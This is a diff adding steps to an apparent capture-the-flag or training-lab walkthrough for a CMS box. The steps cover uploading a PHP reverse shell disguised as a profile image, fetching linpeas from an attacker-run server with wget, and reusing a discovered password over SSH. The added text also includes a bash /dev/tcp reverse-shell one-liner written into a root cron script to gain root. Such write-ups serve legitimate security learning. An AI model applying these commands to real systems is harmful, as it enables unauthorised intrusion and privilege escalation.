@@ -49,6 +49,44 @@ Other tools:
 ```
 Successfully logged inn
 ```
+Now, after successful login I've observed there's a my-profile page where we can upload an image. (But instead of image I uploaded an php reverse shell).
+Note: before uploading the php reverse shell open an netcat listener.
+
+Now, after the successful reverse shell. I thought of privilege escalation but we have limited access.
+
+So, I executed "linpeas.sh"
+
+I downloaded linpeas and opened an python3 http.server
+- Command: wget http://<attacker Ip>:<port>/linpeas.sh
+
+After, executing linpeas.sh I gound an user name "grimmie" and his password "My_V3ryS3cur3_P4ss".
+
+Performed ssh : ssh grimmie@<target ip> 
+
+Found a box backup.sh
+Info: while performing linpeas.sh I didn't find any cronjobs in the machine.
+
+So, in order to check any automated files running on the system I downloaded pspy64 tool. This tools helps to monitor all the processes which are running on the system without root access.
+
+So, downloaded pspy from "https://github.com/DominicBreuker/pspy?tab=readme-ov-file"
+
+I found backup.sh was running for every minute with root privilege.
+
+So, I changed the content of backup.sh and added the one linear bash script for reverse chell.
+
+""' `bash -c 'exec bash -i &>/dev/tcp/192.168.1.12/9999 <&1' '""
+
+
+Finally got the root access and captured the flag.
+
+%% congratz you rooted this box !
+    Loks like this CMS isn't so secure...
+    I hope you enjoyed it.
+    If you have any issue please let us know in the course discord.
+    Happy hacking !
+%%
+
+
 
 
 
